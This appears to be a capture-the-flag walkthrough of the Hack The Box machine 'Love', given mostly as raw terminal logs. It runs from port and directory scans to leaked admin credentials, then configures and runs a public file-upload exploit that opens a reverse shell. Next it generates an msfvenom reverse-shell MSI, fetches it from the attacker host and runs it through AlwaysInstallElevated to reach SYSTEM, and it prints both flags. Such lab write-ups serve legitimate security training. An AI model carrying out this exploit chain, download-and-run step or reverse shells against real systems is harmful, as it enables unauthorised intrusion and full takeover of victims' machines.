Love Ip: 10.10.10.239


rustscan:

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
443/tcp   open  https        syn-ack
445/tcp   open  microsoft-ds syn-ack
3306/tcp  open  mysql        syn-ack
5000/tcp  open  upnp         syn-ack
5040/tcp  open  unknown      syn-ack
7680/tcp  open  pando-pub    syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack

Nmap:


PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/emailAddress=roy@love.htb/localityName=norway/organizationalUnitName=love.htb
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/emailAddress=roy@love.htb/localityName=norway/organizationalUnitName=love.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
| SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
| -----BEGIN CERTIFICATE-----
| MIIDozCCAosCFFhDHcnclWJmeuqOK/LQv3XDNEu4MA0GCSqGSIb3DQEBCwUAMIGN
| MQswCQYDVQQGEwJpbjEKMAgGA1UECAwBbTEPMA0GA1UEBwwGbm9yd2F5MRYwFAYD
| VQQKDA1WYWxlbnRpbmVDb3JwMREwDwYDVQQLDAhsb3ZlLmh0YjEZMBcGA1UEAwwQ
| c3RhZ2luZy5sb3ZlLmh0YjEbMBkGCSqGSIb3DQEJARYMcm95QGxvdmUuaHRiMB4X
| DTIxMDExODE0MDAxNloXDTIyMDExODE0MDAxNlowgY0xCzAJBgNVBAYTAmluMQow
| CAYDVQQIDAFtMQ8wDQYDVQQHDAZub3J3YXkxFjAUBgNVBAoMDVZhbGVudGluZUNv
| cnAxETAPBgNVBAsMCGxvdmUuaHRiMRkwFwYDVQQDDBBzdGFnaW5nLmxvdmUuaHRi
| MRswGQYJKoZIhvcNAQkBFgxyb3lAbG92ZS5odGIwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQDQlH1J/AwbEm2Hnh4Bizch08sUHlHg7vAMGEB14LPq9G20
| PL/6QmYxJOWBPjBWWywNYK3cPIFY8yUmYlLBiVI0piRfaSj7wTLW3GFSPhrpmfz0
| 0zJMKeyBOD0+1K9BxiUQNVyEnihsULZKLmZcF6LhOIhiONEL6mKKr2/mHLgfoR7U
| vM7OmmywdLRgLfXN2Cgpkv7ciEARU0phRq2p1s4W9Hn3XEU8iVqgfFXs/ZNyX3r8
| LtDiQUavwn2s+Hta0mslI0waTmyOsNrE4wgcdcF9kLK/9ttM1ugTJSQAQWbYo5LD
| 2bVw7JidPhX8mELviftIv5W1LguCb3uVb6ipfShxAgMBAAEwDQYJKoZIhvcNAQEL
| BQADggEBANB5x2U0QuQdc9niiW8XtGVqlUZOpmToxstBm4r0Djdqv/Z73I/qys0A
| y7crcy9dRO7M80Dnvj0ReGxoWN/95ZA4GSL8TUfIfXbonrCKFiXOOuS8jCzC9LWE
| nP4jUUlAOJv6uYDajoD3NfbhW8uBvopO+8nywbQdiffatKO35McSl7ukvIK+d7gz
| oool/rMp/fQ40A1nxVHeLPOexyB3YJIMAhm4NexfJ2TKxs10C+lJcuOxt7MhOk0h
| zSPL/pMbMouLTXnIsh4SdJEzEkNnuO69yQoN8XgjM7vHvZQIlzs1R5pk4WIgKHSZ
| 0drwvFE50xML9h2wrGh7L9/CSbhIhO8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds syn-ack Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?       syn-ack
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.4' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '10.10.14.4' is not allowed to connect to this MariaDB server
5000/tcp  open  http         syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown      syn-ack
7680/tcp  open  pando-pub?   syn-ack
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=2/7%Time=63E22E15%P=x86_64-pc-linux-gnu%r(NUL
SF:L,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.4'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h01m33s, deviation: 4h37m08s, median: 21m32s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60838/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46453/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19849/udp): CLEAN (Failed to receive data)
|   Check 4 (port 21885/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-07T03:19:30-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-07T11:19:33
|_  start_date: N/A





┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ gobuster dir  -u http://staging.love.htb  -w /usr/share/wordlists/dirb/common.txt -t 64  -x log,txt,php,html 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://staging.love.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     log,txt,php,html
[+] Timeout:        10s
===============================================================
2023/02/07 06:07:12 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.log (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/admin.cgi (Status: 403)
/admin.cgi.log (Status: 403)
/admin.cgi.txt (Status: 403)
/admin.cgi.html (Status: 403)
/admin.pl (Status: 403)
/admin.pl.log (Status: 403)
/admin.pl.txt (Status: 403)
/admin.pl.html (Status: 403)
/AT-admin.cgi (Status: 403)
/AT-admin.cgi.log (Status: 403)
/AT-admin.cgi.txt (Status: 403)
/AT-admin.cgi.html (Status: 403)
/aux (Status: 403)
/aux.log (Status: 403)
/aux.txt (Status: 403)
/aux.php (Status: 403)
/aux.html (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.hta.log (Status: 403)
/.hta.txt (Status: 403)
/beta.php (Status: 200)
/.htpasswd (Status: 403)
/.htpasswd.log (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/cachemgr.cgi (Status: 403)
/cachemgr.cgi.log (Status: 403)
/cachemgr.cgi.txt (Status: 403)
/cachemgr.cgi.html (Status: 403)
/cgi-bin/ (Status: 403)
/cgi-bin/.html (Status: 403)
/com1 (Status: 403)
/com1.log (Status: 403)
/com1.txt (Status: 403)
/com1.php (Status: 403)
/com1.html (Status: 403)
/com2 (Status: 403)
/com2.log (Status: 403)
/com2.txt (Status: 403)
/com2.php (Status: 403)
/com3 (Status: 403)
/com2.html (Status: 403)
/com3.php (Status: 403)
/com3.html (Status: 403)
/com3.log (Status: 403)
/com3.txt (Status: 403)
/con (Status: 403)
/con.txt (Status: 403)
/con.php (Status: 403)
/con.html (Status: 403)
/con.log (Status: 403)
/Index.php (Status: 200)
/index.php (Status: 200)
/index.php (Status: 200)
/licenses (Status: 403)
/lpt1 (Status: 403)
/lpt1.txt (Status: 403)
/lpt1.php (Status: 403)
/lpt1.html (Status: 403)
/lpt1.log (Status: 403)
/lpt2 (Status: 403)
/lpt2.html (Status: 403)
/lpt2.log (Status: 403)
/lpt2.txt (Status: 403)
/lpt2.php (Status: 403)
/nul (Status: 403)
/nul.log (Status: 403)
/nul.txt (Status: 403)
/nul.php (Status: 403)
/nul.html (Status: 403)
/phpmyadmin (Status: 403)
/prn (Status: 403)
/prn.log (Status: 403)
/prn.txt (Status: 403)
/prn.php (Status: 403)
/prn.html (Status: 403)
/server-info (Status: 403)
/server-status (Status: 403)
/webalizer (Status: 403)
===============================================================
2023/02/07 06:07:52 Finished
===============================================================
                                                                                                                                                                         



  ┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ gobuster dir  -u http://love.htb  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64                     
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://love.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/02/07 07:24:27 Starting gobuster
===============================================================
/images (Status: 301)
/Images (Status: 301)
/admin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/dist (Status: 301)
/licenses (Status: 403)
/IMAGES (Status: 301)
/%20 (Status: 403)
/Admin (Status: 301)
/*checkout* (Status: 403)
/Plugins (Status: 301)
/phpmyadmin (Status: 403)
/webalizer (Status: 403)
/*docroot* (Status: 403)
/* (Status: 403)
/con (Status: 403)
/http%3A (Status: 403)
/Includes (Status: 301)
/**http%3a (Status: 403)
/*http%3A (Status: 403)
/aux (Status: 403)
/Dist (Status: 301)
/**http%3A (Status: 403)
/%C0 (Status: 403)
/server-status (Status: 403)
/%3FRID%3D2671 (Status: 403)
/devinmoore* (Status: 403)
/200109* (Status: 403)
/*sa_ (Status: 403)
/*dc_ (Status: 403)
/%D8 (Status: 403)
/%CD (Status: 403)
/%CF (Status: 403)
/%CE (Status: 403)
/%CB (Status: 403)
/%CC (Status: 403)
/%CA (Status: 403)
/%D0 (Status: 403)
/%D1 (Status: 403)
/%D7 (Status: 403)
/%D5 (Status: 403)
/%D6 (Status: 403)
/%D3 (Status: 403)
/%D4 (Status: 403)
/%D2 (Status: 403)
/%C9 (Status: 403)
/%C1 (Status: 403)
/%C8 (Status: 403)
/%C2 (Status: 403)
/%C7 (Status: 403)
/%C6 (Status: 403)
/%C5 (Status: 403)
/%C4 (Status: 403)
/%C3 (Status: 403)
/%D9 (Status: 403)
/%DF (Status: 403)
/%DD (Status: 403)
/%DE (Status: 403)
/%DB (Status: 403)
/login%3f (Status: 403)
/%22britney%20spears%22 (Status: 403)
/%22james%20kim%22 (Status: 403)
/%22julie%20roehm%22 (Status: 403)
===============================================================
2023/02/07 07:28:17 Finished
===============================================================

 
I've tried reaching all other http ports           mentioned by nmap, but with no resutls
.

Visiting http://staging.love.htb/beta.php (which was mentioned in nmap scan), i can try to test a specific http. I will try to see what happens when I try to scan port 5000 on localhost



Password Dashboard
Home
Demo

Voting system Administration
Vote Admin Creds admin: @LoveIsInTheAir!!!! 

Great, it seems that we have credentials . I will try them on site from port 80
┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ searchsploit voting system 1.0 
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Voting System 1.0 - Authentication Bypass (SQLi)                                                                                                            | php/webapps/50075.txt
Online Voting System 1.0 - Remote Code Execution (Authenticated)                                                                                                   | php/webapps/50076.txt
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)                                                                              | php/webapps/50088.py
Voting System 1.0 - Authentication Bypass (SQLI)                                                                                                                   | php/webapps/49843.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                          | php/webapps/49445.py
Voting System 1.0 - Remote Code Execution (Unauthenticated)                                                                                                        | php/webapps/49846.txt
Voting System 1.0 - Time based SQLI (Unauthenticated SQL injection)                                                                                                | php/webapps/49817.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ searchsploit -m php/webapps/50088.py
  Exploit: Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50088
     Path: /usr/share/exploitdb/exploits/php/webapps/50088.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/kali/Practice/HackTheBox/Love/50088.py

exploit 50088 did not work

tried another exploit

                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ searchsploit -m php/webapps/49445.py

  Exploit: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
      URL: https://www.exploit-db.com/exploits/49445
     Path: /usr/share/exploitdb/exploits/php/webapps/49445.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/kali/Practice/HackTheBox/Love/49445.py



edit exploit in order to have the following:


# --- Edit your settings here ----
IP = "10.10.10.239" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.4" # Reverse shell IP
REV_PORT = "8888" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"

start a listener on port 8888 and then run the exploit:
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ python3 49445.py
Start a NC listner on the port you choose above and run...
Logged in
Poc sent successfully



                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.239] 53435
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>



User flag: 59d05aefd0d49028b5722862ecf90d2d

PrivESC:

C:\Users\Phoebe\Desktop>systeminfo
systeminfo

Host Name:                 LOVE
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          roy
Registered Organization:   
Product ID:                00330-80112-18556-AA148
Original Install Date:     4/12/2021, 12:14:12 PM
System Boot Time:          2/7/2023, 3:11:59 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,598 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,956 MB
Virtual Memory: In Use:    1,843 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\LOVE
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB4589212
                           [08]: KB5000802
                           [09]: KB5000858
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.239
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.


C:\Users\Phoebe\Desktop>whoami/priv
whoami/priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled



C:\Users\Phoebe\Desktop>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


Taking in consideration this, we can create an msi file , install and run it as administrator

first create a payload with msfvenom:
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f msi -o rev.msi

host the file

sudo python -m HttpSever 80


download the file in C:\ProgramData
PS C:\ProgramData> powershell wget http://10.10.14.4/rev.msi -outfile rev.msi
powershell wget http://10.10.14.4/rev.msi -outfile rev.msi
PS C:\ProgramData> ls
ls


    Directory: C:\ProgramData


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         7/10/2015   4:04 AM                Comms                                                                
d---s-         4/23/2021   3:39 AM                Microsoft                                                            
d-----        11/18/2020  11:45 PM                Microsoft OneDrive                                                   
d-----         4/21/2021   7:58 AM                Package Cache                                                        
d-----         4/13/2021   8:40 AM                Packages                                                             
d-----          2/7/2023   3:12 AM                regid.1991-06.com.microsoft                                          
d-----         12/7/2019   1:14 AM                SoftwareDistribution                                                 
d-----        11/18/2020   6:54 PM                ssh                                                                  
d-----         4/12/2021   1:14 PM                USOPrivate                                                           
d-----         12/7/2019   1:14 AM                USOShared                                                            
d-----         4/21/2021  10:02 AM                VMware                                                               
d-----         12/7/2019   1:52 AM                WindowsHolographicDevices                                            
-a----          2/7/2023   6:19 AM         159744 rev.msi   


start a listener on port 4444:

                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...


run rev.msi

PS C:\ProgramData> msiexec /quiet /qn /i rev.msi
msiexec /quiet /qn /i rev.msi
PS C:\ProgramData> 



                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Love]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.239] 53437
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
f2416e479affbd7447d176810e3a3719

C:\Users\Administrator\Desktop>





